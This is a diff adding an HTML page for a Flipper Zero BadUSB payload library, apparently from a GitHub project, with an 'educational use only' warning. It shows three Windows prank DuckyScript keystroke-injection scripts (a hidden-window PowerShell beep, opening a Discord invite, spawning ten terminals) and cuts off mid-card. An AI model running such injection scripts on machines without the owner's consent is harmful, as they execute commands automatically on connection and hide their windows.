@@ -1,0 +1,1250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Flipper Zero — BadUSB Payload Library</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;1,400&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel="stylesheet"/>
+<style>
+/* ── TOKENS ── */
+:root {
+  --bg:      #0d0d0d;
+  --bg1:     #141414;
+  --bg2:     #1a1a1a;
+  --bg3:     #222;
+  --border:  #272727;
+  --border2: #333;
+
+  --text:    #e8e8e8;
+  --text2:   #888;
+  --text3:   #484848;
+
+  --green:   #4ade80;
+  --orange:  #fb923c;
+  --red:     #f87171;
+
+  --win:     #60a5fa;
+  --mac:     #aaa;
+  --ios:     #f97316;
+
+  --mono: 'IBM Plex Mono', monospace;
+  --sans: 'IBM Plex Sans', sans-serif;
+
+  --sidebar: 216px;
+  --hdr: 52px;
+  --r: 5px;
+  --r2: 8px;
+}
+
+/* ── RESET ── */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  font-size: 14px;
+  line-height: 1.6;
+  min-height: 100dvh;
+  -webkit-font-smoothing: antialiased;
+}
+a { color: inherit; text-decoration: none; }
+button { cursor: pointer; }
+
+/* ── LAYOUT ── */
+.app {
+  display: grid;
+  grid-template-rows: var(--hdr) 1fr auto;
+  grid-template-columns: var(--sidebar) 1fr;
+  grid-template-areas: "hdr hdr" "side main" "ftr ftr";
+  min-height: 100dvh;
+}
+
+/* ── HEADER ── */
+header {
+  grid-area: hdr;
+  background: var(--bg1);
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; gap: 1rem;
+  padding: 0 1.25rem;
+  position: sticky; top: 0; z-index: 300;
+}
+.logo {
+  display: flex; align-items: center; gap: .45rem;
+  font-family: var(--mono); font-size: .75rem; font-weight: 500;
+  color: var(--text); white-space: nowrap; flex-shrink: 0;
+}
+.logo-d { font-size: .85rem; }
+.hdr-divider { width: 1px; height: 16px; background: var(--border2); flex-shrink: 0; }
+.hdr-stats {
+  display: flex; align-items: center; gap: .75rem;
+  overflow: hidden;
+}
+.hdr-stat {
+  font-family: var(--mono); font-size: .62rem;
+  color: var(--text3); white-space: nowrap;
+}
+.hdr-stat b { color: var(--text2); font-weight: 500; }
+.hdr-right { margin-left: auto; display: flex; align-items: center; gap: .4rem; flex-shrink: 0; }
+
+/* Buttons */
+.btn {
+  display: inline-flex; align-items: center; gap: 5px;
+  font-family: var(--mono); font-size: .62rem;
+  border-radius: var(--r);
+  padding: 5px 10px; border: 1px solid;
+  transition: opacity .15s, border-color .15s, color .15s;
+  white-space: nowrap;
+}
+.btn-ghost { color: var(--text2); border-color: var(--border2); background: none; }
+.btn-ghost:hover { color: var(--text); border-color: var(--text3); }
+.btn-solid { color: var(--bg); background: var(--text); border-color: var(--text); }
+.btn-solid:hover { opacity: .8; }
+.btn-icon { padding: 5px 8px; }
+
+/* Mobile menu toggle */
+.menu-toggle {
+  display: none;
+  background: none; border: 1px solid var(--border2);
+  border-radius: var(--r);
+  padding: 5px 8px; color: var(--text2);
+  align-items: center; justify-content: center;
+}
+.menu-toggle:hover { color: var(--text); }
+
+/* ── SIDEBAR ── */
+aside {
+  grid-area: side;
+  background: var(--bg1);
+  border-right: 1px solid var(--border);
+  position: sticky; top: var(--hdr);
+  height: calc(100dvh - var(--hdr));
+  overflow-y: auto;
+  overflow-x: hidden;
+  padding: 1.25rem 0 2rem;
+  display: flex; flex-direction: column;
+  scrollbar-width: none;
+}
+aside::-webkit-scrollbar { display: none; }
+
+.side-lbl {
+  padding: 0 1rem .4rem;
+  font-family: var(--mono); font-size: .55rem;
+  letter-spacing: .14em; text-transform: uppercase;
+  color: var(--text3);
+  margin-top: 1.25rem;
+}
+.side-lbl:first-child { margin-top: 0; }
+
+.os-btn {
+  display: flex; align-items: center; gap: 7px;
+  width: 100%; padding: 8px 1rem;
+  background: none; border: none;
+  border-left: 2px solid transparent;
+  font-family: var(--sans); font-size: .8rem;
+  color: var(--text2); text-align: left;
+  transition: color .12s, background .12s;
+}
+.os-btn:hover { background: var(--bg2); color: var(--text); }
+.os-btn.active { color: var(--text); background: var(--bg2); }
+.os-btn[data-os="windows"].active { border-left-color: var(--win); }
+.os-btn[data-os="macos"].active   { border-left-color: var(--mac); }
+.os-btn[data-os="ios"].active     { border-left-color: var(--ios); }
+.os-n { margin-left: auto; font-family: var(--mono); font-size: .58rem; color: var(--text3); }
+
+.cat-nav { display: none; }
+.cat-nav.open { display: block; }
+.cat-btn {
+  display: flex; align-items: center; gap: 5px;
+  width: 100%; padding: 4px 1rem 4px 2.25rem;
+  background: none; border: none;
+  font-family: var(--mono); font-size: .65rem;
+  color: var(--text3); text-align: left;
+  transition: color .12s;
+}
+.cat-btn::before { content: '–'; font-size: .5rem; color: var(--border2); }
+.cat-btn:hover { color: var(--text2); }
+.cat-btn.active { color: var(--text); }
+
+.side-sep { height: 1px; background: var(--border); margin: 1rem 1rem; }
+
+.pap-legend { padding: 0 1rem; }
+.pap-row {
+  display: flex; align-items: center; gap: 6px;
+  font-family: var(--mono); font-size: .6rem;
+  color: var(--text3); margin-bottom: 4px;
+}
+.dot { width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0; }
+.dot-g { background: var(--green); }
+.dot-o { background: var(--orange); }
+.dot-r { background: var(--red); }
+
+/* Sidebar CTA */
+.side-cta {
+  margin: auto 1rem 0;
+  padding: .875rem;
+  background: var(--bg2);
+  border: 1px solid var(--border2);
+  border-radius: var(--r2);
+}
+.side-cta-title {
+  font-family: var(--mono); font-size: .58rem;
+  letter-spacing: .08em; text-transform: uppercase;
+  color: var(--text2); margin-bottom: .35rem;
+  display: flex; align-items: center; gap: 5px;
+}
+.side-cta p {
+  font-size: .72rem; color: var(--text3);
+  line-height: 1.55; margin-bottom: .6rem;
+}
+.side-cta .btn { width: 100%; justify-content: center; font-size: .61rem; }
+
+/* ── MAIN ── */
+main { grid-area: main; padding: 1.75rem 2rem; min-width: 0; }
+
+.os-section { display: none; }
+.os-section.active { display: block; animation: fadein .18s ease; }
+@keyframes fadein {
+  from { opacity: 0; transform: translateY(4px); }
+  to   { opacity: 1; transform: none; }
+}
+
+/* Warning */
+.warning {
+  display: flex; gap: .75rem;
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--orange);
+  border-radius: var(--r2);
+  padding: 1rem 1.125rem;
+  margin-bottom: 2.25rem;
+}
+.warning-icon { color: var(--orange); flex-shrink: 0; padding-top: 2px; font-size: .9rem; line-height: 1.6; }
+.warning-title {
+  font-family: var(--mono); font-size: .58rem;
+  letter-spacing: .1em; text-transform: uppercase;
+  color: var(--orange); margin-bottom: .3rem;
+}
+.warning p { font-size: .79rem; color: var(--text2); line-height: 1.7; }
+.warning p + p { margin-top: .2rem; }
+.warning strong { color: var(--text); font-weight: 500; }
+.warning a { color: var(--text2); text-decoration: underline; text-underline-offset: 3px; }
+.warning a:hover { color: var(--text); }
+
+/* Section head */
+.section-head {
+  display: flex; align-items: center; justify-content: space-between;
+  padding-bottom: .875rem;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 1.875rem;
+  flex-wrap: wrap; gap: .5rem;
+}
+.section-title {
+  font-family: var(--mono); font-size: .95rem; font-weight: 500;
+  display: flex; align-items: center; gap: .65rem;
+}
+.section-sub { font-family: var(--mono); font-size: .6rem; color: var(--text3); }
+.section-pill {
+  font-family: var(--mono); font-size: .58rem; color: var(--text3);
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 20px; padding: 2px 10px; white-space: nowrap;
+}
+
+/* Cat group */
+.cat-group { margin-bottom: 2.25rem; }
+.cat-head {
+  display: flex; align-items: center; gap: .6rem;
+  margin-bottom: .875rem;
+}
+.cat-title {
+  font-family: var(--mono); font-size: .58rem;
+  letter-spacing: .12em; text-transform: uppercase;
+  color: var(--text3); white-space: nowrap;
+}
+.cat-rule { flex: 1; height: 1px; background: var(--border); }
+.cat-count { font-family: var(--mono); font-size: .56rem; color: var(--text3); }
+
+/* Cards grid */
+.cards {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+  background: var(--border);
+  border: 1px solid var(--border);
+  border-radius: var(--r2);
+  gap: 1px; overflow: hidden;
+}
+
+/* Card */
+.card {
+  background: var(--bg1);
+  padding: .9rem 1rem;
+  transition: background .12s;
+  min-width: 0;
+}
+.card:hover { background: var(--bg2); }
+
+.card-top {
+  display: flex; align-items: flex-start;
+  justify-content: space-between; gap: .4rem;
+  margin-bottom: .35rem;
+}
+.card-title {
+  font-size: .85rem; font-weight: 500; color: var(--text);
+  line-height: 1.3; word-break: break-word;
+}
+.pap-badge {
+  display: flex; align-items: center; gap: 3px;
+  font-family: var(--mono); font-size: .53rem;
+  color: var(--text3); flex-shrink: 0; padding-top: 2px;
+}
+.pap-badge .dot { width: 5px; height: 5px; }
+
+.tags { display: flex; gap: 3px; flex-wrap: wrap; margin-bottom: .55rem; }
+.tag {
+  font-family: var(--mono); font-size: .53rem;
+  padding: 1px 6px; border-radius: 3px; border: 1px solid;
+}
+.tag-win { color: var(--win); border-color: rgba(96,165,250,.18); background: rgba(96,165,250,.04); }
+.tag-mac { color: var(--mac); border-color: rgba(170,170,170,.15); background: rgba(170,170,170,.03); }
+.tag-ios { color: var(--ios); border-color: rgba(249,115,22,.18); background: rgba(249,115,22,.04); }
+.tag-cat { color: var(--text3); border-color: var(--border); background: transparent; }
+
+/* Toggle */
+.toggle-btn {
+  display: inline-flex; align-items: center; gap: 4px;
+  background: none; border: none;
+  font-family: var(--mono); font-size: .6rem;
+  color: var(--text3); padding: 0;
+  transition: color .12s;
+  -webkit-tap-highlight-color: transparent;
+}
+.toggle-btn:hover { color: var(--text2); }
+.toggle-btn.open { color: var(--text2); }
+.t-arrow { display: inline-block; transition: transform .22s ease; line-height: 1; }
+.toggle-btn.open .t-arrow { transform: rotate(180deg); }
+
+/* Collapsible body */
+.card-body {
+  overflow: hidden;
+  max-height: 0; opacity: 0;
+  transition: max-height .3s ease, opacity .22s ease;
+}
+.card-body.open { max-height: 600px; opacity: 1; }
+
+/* Code block */
+.code-block {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: var(--r);
+  overflow: hidden;
+  margin-top: .65rem; margin-bottom: .55rem;
+}
+.code-bar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 4px 9px;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg1);
+}
+.code-lang {
+  font-family: var(--mono); font-size: .53rem;
+  letter-spacing: .1em; text-transform: uppercase; color: var(--text3);
+}
+.copy-btn {
+  display: flex; align-items: center; gap: 4px;
+  font-family: var(--mono); font-size: .58rem;
+  color: var(--text3); background: none; border: none;
+  padding: 2px 0; transition: color .12s;
+  -webkit-tap-highlight-color: transparent;
+}
+.copy-btn:hover, .copy-btn:active { color: var(--text); }
+.copy-btn.done { color: var(--green); }
+
+pre {
+  padding: .7rem .9rem;
+  font-family: var(--mono); font-size: .65rem;
+  line-height: 1.7; color: var(--text2);
+  overflow-x: auto; max-height: 220px;
+  -webkit-overflow-scrolling: touch;
+}
+pre::-webkit-scrollbar { height: 3px; }
+pre::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
+
+.kw  { color: #93c5fd; }
+.str { color: #86efac; }
+.cmt { color: #3a3a3a; font-style: italic; }
+.num { color: #fdba74; }
+
+.card-foot { display: flex; justify-content: flex-end; }
+.gh-link {
+  font-family: var(--mono); font-size: .58rem;
+  color: var(--text3); display: flex; align-items: center; gap: 3px;
+  transition: color .12s; -webkit-tap-highlight-color: transparent;
+}
+.gh-link:hover { color: var(--text2); }
+
+/* ── CONTRIBUTE BANNER ── */
+.contribute {
+  margin-top: .25rem;
+  display: flex; align-items: center; justify-content: space-between;
+  gap: 1.5rem; flex-wrap: wrap;
+  background: var(--bg2);
+  border: 1px solid var(--border2);
+  border-radius: var(--r2);
+  padding: 1.375rem 1.5rem;
+}
+.contribute-body { flex: 1; min-width: 180px; }
+.contribute-title {
+  font-family: var(--mono); font-size: .65rem;
+  letter-spacing: .08em; text-transform: uppercase;
+  color: var(--text); margin-bottom: .35rem;
+  display: flex; align-items: center; gap: 5px;
+}
+.contribute-desc { font-size: .8rem; color: var(--text2); line-height: 1.65; }
+.contribute-desc code {
+  font-family: var(--mono); font-size: .72rem;
+  background: var(--bg3); border: 1px solid var(--border2);
+  border-radius: 3px; padding: 1px 5px;
+}
+.contribute-actions { display: flex; gap: .45rem; align-items: center; flex-shrink: 0; flex-wrap: wrap; }
+
+/* ── FOOTER ── */
+footer {
+  grid-area: ftr;
+  background: var(--bg1);
+  border-top: 1px solid var(--border);
+  padding: .875rem 1.25rem;
+  display: flex; align-items: center; justify-content: space-between;
+  flex-wrap: wrap; gap: .5rem;
+  font-family: var(--mono); font-size: .58rem; color: var(--text3);
+}
+footer a { color: var(--text3); }
+footer a:hover { color: var(--text2); }
+
+/* ── MOBILE DRAWER OVERLAY ── */
+.drawer-overlay {
+  display: none;
+  position: fixed; inset: 0; z-index: 150;
+  background: rgba(0,0,0,.6);
+  backdrop-filter: blur(2px);
+  -webkit-backdrop-filter: blur(2px);
+}
+.drawer-overlay.open { display: block; }
+
+/* ═══════════════════════════════
+   RESPONSIVE — TABLET (≤ 900px)
+═══════════════════════════════ */
+@media (max-width: 900px) {
+  .app {
+    grid-template-columns: 1fr;
+    grid-template-areas: "hdr" "main" "ftr";
+  }
+
+  /* Sidebar becomes a slide-in drawer */
+  aside {
+    position: fixed;
+    left: -100%; top: 0; bottom: 0;
+    width: min(280px, 85vw);
+    height: 100dvh;
+    z-index: 200;
+    border-right: 1px solid var(--border2);
+    box-shadow: 4px 0 24px rgba(0,0,0,.5);
+    transition: left .26s cubic-bezier(.4,0,.2,1);
+    padding-top: calc(var(--hdr) + 1rem);
+  }
+  aside.open { left: 0; }
+
+  .menu-toggle { display: inline-flex; }
+  .hdr-stats { display: none; }
+  .hdr-divider { display: none; }
+
+  main { padding: 1.25rem 1rem; }
+  .cards { grid-template-columns: 1fr; }
+
+  .warning { flex-direction: column; gap: .5rem; }
+
+  .contribute { flex-direction: column; gap: 1rem; }
+  .contribute-actions { width: 100%; }
+  .contribute-actions .btn { flex: 1; justify-content: center; }
+}
+
+/* ═══════════════════════════════
+   RESPONSIVE — SMALL (≤ 480px)
+═══════════════════════════════ */
+@media (max-width: 480px) {
+  main { padding: 1rem .75rem; }
+
+  .logo span:last-child { display: none; }
+
+  .section-head { gap: .4rem; }
+  .section-title { font-size: .85rem; }
+
+  .card { padding: .8rem .875rem; }
+  .card-title { font-size: .82rem; }
+
+  pre { font-size: .62rem; }
+
+  footer { flex-direction: column; gap: .35rem; text-align: center; }
+  footer > *:last-child { display: none; }
+
+  .contribute { padding: 1rem 1.125rem; }
+
+  .btn { padding: 5px 9px; font-size: .6rem; }
+  .btn-icon { padding: 5px 7px; }
+}
+
+/* ═══════════════════════════════
+   RESPONSIVE — XSMALL (≤ 360px)
+═══════════════════════════════ */
+@media (max-width: 360px) {
+  :root { --hdr: 48px; }
+  .logo { font-size: .7rem; }
+  main { padding: .875rem .625rem; }
+  .card { padding: .75rem .75rem; }
+}
+
+/* ── TOUCH ── */
+@media (hover: none) {
+  .card:hover { background: var(--bg1); }
+  .toggle-btn:hover { color: var(--text3); }
+  .copy-btn:hover { color: var(--text3); }
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+<!-- ── HEADER ── -->
+<header>
+  <button class="menu-toggle btn" onclick="toggleDrawer()" aria-label="Open menu">
+    <svg width="13" height="13" viewBox="0 0 16 16" fill="currentColor"><path d="M1 3h14v1.5H1zm0 4.5h14V9H1zm0 4.5h14V13H1z"/></svg>
+  </button>
+
+  <div class="logo">
+    <span class="logo-d">🐬</span>
+    <span>Flipper Zero · BadUSB</span>
+  </div>
+
+  <div class="hdr-divider"></div>
+
+  <div class="hdr-stats">
+    <span class="hdr-stat"><b>44</b> payloads</span>
+    <span class="hdr-stat"><b>15</b> Win</span>
+    <span class="hdr-stat"><b>26</b> Mac</span>
+    <span class="hdr-stat"><b>3</b> iOS</span>
+  </div>
+
+  <div class="hdr-right">
+    <a class="btn btn-ghost" href="https://github.com/bst04/payloads_flipperZero/pulls" target="_blank" rel="noopener">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="currentColor"><path d="M1.5 3.25a2.25 2.25 0 1 1 3 2.122v5.256a2.251 2.251 0 1 1-1.5 0V5.372A2.25 2.25 0 0 1 1.5 3.25Zm5.677-.177L9.573.677A.25.25 0 0 1 10 .854V2.5h1A2.5 2.5 0 0 1 13.5 5v5.628a2.251 2.251 0 1 1-1.5 0V5a1 1 0 0 0-1-1h-1v1.646a.25.25 0 0 1-.427.177L7.177 3.427a.25.25 0 0 1 0-.354Z"/></svg>
+      <span>PR</span>
+    </a>
+    <a class="btn btn-solid btn-icon" href="https://github.com/bst04/payloads_flipperZero" target="_blank" rel="noopener" aria-label="GitHub">
+      <svg width="13" height="13" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg>
+    </a>
+  </div>
+</header>
+
+<!-- ── DRAWER OVERLAY ── -->
+<div class="drawer-overlay" id="overlay" onclick="toggleDrawer()"></div>
+
+<!-- ── SIDEBAR ── -->
+<aside id="sidebar">
+  <p class="side-lbl">Platform</p>
+  <button class="os-btn" data-os="windows" onclick="switchOS('windows')">🪟 Windows <span class="os-n">15</span></button>
+  <div class="cat-nav" id="cnav-windows">
+    <button class="cat-btn" onclick="scrollCat('windows','Prank',event)">Prank</button>
+    <button class="cat-btn" onclick="scrollCat('windows','Execution',event)">Execution</button>
+    <button class="cat-btn" onclick="scrollCat('windows','Utility',event)">Utility</button>
+    <button class="cat-btn" onclick="scrollCat('windows','General',event)">General</button>
+    <button class="cat-btn" onclick="scrollCat('windows','Credentials',event)">Credentials</button>
+  </div>
+  <button class="os-btn" data-os="macos" onclick="switchOS('macos')">🍎 macOS <span class="os-n">26</span></button>
+  <div class="cat-nav" id="cnav-macos">
+    <button class="cat-btn" onclick="scrollCat('macos','Execution',event)">Execution</button>
+    <button class="cat-btn" onclick="scrollCat('macos','Credentials',event)">Credentials</button>
+    <button class="cat-btn" onclick="scrollCat('macos','Prank',event)">Prank</button>
+    <button class="cat-btn" onclick="scrollCat('macos','General',event)">General</button>
+    <button class="cat-btn" onclick="scrollCat('macos','Updates',event)">Updates</button>
+  </div>
+  <button class="os-btn" data-os="ios" onclick="switchOS('ios')">📱 iOS <span class="os-n">3</span></button>
+  <div class="cat-nav" id="cnav-ios">
+    <button class="cat-btn" onclick="scrollCat('ios','Prank',event)">Prank</button>
+    <button class="cat-btn" onclick="scrollCat('ios','General',event)">General</button>
+  </div>
+
+  <div class="side-sep"></div>
+
+  <p class="side-lbl">PAP Status</p>
+  <div class="pap-legend">
+    <div class="pap-row"><span class="dot dot-g"></span>Plug &amp; Play</div>
+    <div class="pap-row"><span class="dot dot-o"></span>Requires setup</div>
+    <div class="pap-row"><span class="dot dot-r"></span>In progress</div>
+  </div>
+
+  <div class="side-cta">
+    <div class="side-cta-title">
+      <svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M1.5 3.25a2.25 2.25 0 1 1 3 2.122v5.256a2.251 2.251 0 1 1-1.5 0V5.372A2.25 2.25 0 0 1 1.5 3.25Zm5.677-.177L9.573.677A.25.25 0 0 1 10 .854V2.5h1A2.5 2.5 0 0 1 13.5 5v5.628a2.251 2.251 0 1 1-1.5 0V5a1 1 0 0 0-1-1h-1v1.646a.25.25 0 0 1-.427.177L7.177 3.427a.25.25 0 0 1 0-.354Z"/></svg>
+      Contribute
+    </div>
+    <p>Add your own payload by opening a pull request on GitHub.</p>
+    <a class="btn btn-ghost" href="https://github.com/bst04/payloads_flipperZero/pulls" target="_blank" rel="noopener">Open a Pull Request →</a>
+  </div>
+</aside>
+
+<!-- ── MAIN ── -->
+<main>
+
+<!-- Warning -->
+<div class="warning">
+  <span class="warning-icon">⚠</span>
+  <div>
+    <div class="warning-title">Educational use only</div>
+    <p><strong>BadUSB payloads</strong> are DuckyScript® scripts the <strong>Flipper Zero</strong> executes by emulating a USB keyboard — automatically running commands upon connection.</p>
+    <p>Only use on <strong>your own devices or systems you have explicit permission to test</strong>. Unauthorized use is illegal. By <a href="https://github.com/bst04" target="_blank" rel="noopener">bst04</a> · <a href="https://github.com/bst04/payloads_flipperZero" target="_blank" rel="noopener">GitHub</a> · GPL-3.0</p>
+  </div>
+</div>
+
+<!-- ════ WINDOWS ════ -->
+<section class="os-section" id="section-windows">
+  <div class="section-head">
+    <div class="section-title">🪟 Windows <span class="section-sub">DuckyScript 1.0</span></div>
+    <span class="section-pill">15 payloads</span>
+  </div>
+
+  <div class="cat-group" id="windows-Prank">
+    <div class="cat-head"><span class="cat-title">Prank</span><div class="cat-rule"></div><span class="cat-count">6</span></div>
+    <div class="cards">
+
+      <article class="card">
+        <div class="card-top"><span class="card-title">Alarm</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Prank</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Alarm — Windows</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> powershell -NoP -W H -C <span class="str">"[console]::beep(1000,500)"</span>
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/Alarm-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+
+      <article class="card">
+        <div class="card-top"><span class="card-title">Join Discord Server</span><span class="pap-badge"><span class="dot dot-o"></span>Orange</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Prank</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Join Discord Server</span>
+<span class="cmt">REM ⚠ Replace INVITE_CODE</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">500</span>
+<span class="kw">STRING</span> https://discord.gg/INVITE_CODE
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/JoinDiscord-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+
+      <article class="card">
+        <div class="card-top"><span class="card-title">Spam Terminals</span><span class="pap-badge"><span class="dot dot-g"></span>Green</span></div>
+        <div class="tags"><span class="tag tag-win">Windows</span><span class="tag tag-cat">Prank</span></div>
+        <div class="code-block">
+          <div class="code-bar"><span class="code-lang">DuckyScript</span><button class="copy-btn" onclick="copyCode(this)"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg> Copy</button></div>
+          <pre><code><span class="cmt">REM Spam 10 cmd terminals</span>
+<span class="kw">DELAY</span> <span class="num">1000</span>
+<span class="kw">DEFAULT_DELAY</span> <span class="num">300</span>
+<span class="kw">REPEAT</span> <span class="num">10</span>
+<span class="kw">GUI</span> r
+<span class="kw">DELAY</span> <span class="num">400</span>
+<span class="kw">STRING</span> cmd
+<span class="kw">ENTER</span></code></pre>
+        </div>
+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero/tree/main/win/SpamTerminals-FlipZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+
+      <article class="card">
